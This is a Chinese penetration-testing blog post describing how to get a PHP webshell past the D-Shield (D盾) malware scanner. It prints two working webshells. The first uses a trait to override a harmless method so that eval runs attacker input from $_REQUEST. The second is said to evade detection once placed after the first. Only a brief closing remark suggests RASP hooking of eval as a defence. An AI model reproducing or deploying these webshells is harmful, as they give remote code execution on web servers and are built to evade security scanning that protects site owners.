---
title: 利用 PHP Trait 特性绕过 D 盾查杀
date: 2019-07-25 15:14:14
tags: [web, pentest]
---

帮着公司审着代码, 发现一个 PHP 挺好玩的特性, 突发奇想, 想看看能不能绕 D 盾, 没想到就成了.

<!--more-->

这个特性已经写在 Title 里面了, 具体可以参考 [php.net](https://www.php.net/traits) 上的介绍,  
说人话就是覆盖方法, 于是我们就可以覆盖父类的方法, 把无害的变成有害的.  

不废话, 直接看 shell 代码

```php
<?php
trait T {
    function dynamic() {
        eval("$this->s");
    }
}

class B {
    function dynamic() {
        echo "I am innocent";
    }

    function __construct() {
        $this->s = $_REQUEST['s'];
    }
}

class C extends B {
    use T;

    function __construct() {
        parent::__construct();
        $this->dynamic();
    }
}

$c = new C();
```

可以看到用 T 的 `dynamic` 覆盖了 B 的 `dynamic`, 导致了代码执行,  
个人猜测是 D 盾不支持 `trait`, 没有把里面的 eval 当成代码, 直接给跳过了.  

![](https://i.loli.net/2019/07/25/5d395c8b9e25359401.png)  
![](https://i.loli.net/2019/07/25/5d395c8b9b5f447606.png)  
![](https://i.loli.net/2019/07/25/5d395c8bbdf0329396.png)  

而且很神奇的是, 在这一段下面放一段本来过不了的, 也能过 D 盾了.

```php
class B {
    public $c;

    function __construct() { 
            $this->c = $_REQUEST['a'];
    }

    function a() {
            eval($this->c);
    }
}
$d = new B();
$d->a();
```

感觉 D 盾内应该有好几种引擎, trait 把其中基于数据流的引擎给搞崩了? 于是也就能过了.  
比较的谜...

最后, PHP 这种动态语言, 静态查杀的难度是真的大...  
特别涉及类, 过 D 盾的姿势非常多, 百度随便搜搜就有一堆. 想要真正防止, 还是靠 rasp 这种技术吧.  
hook eval, 然后检测数据流是否来自 $_POST, $_GET 等等

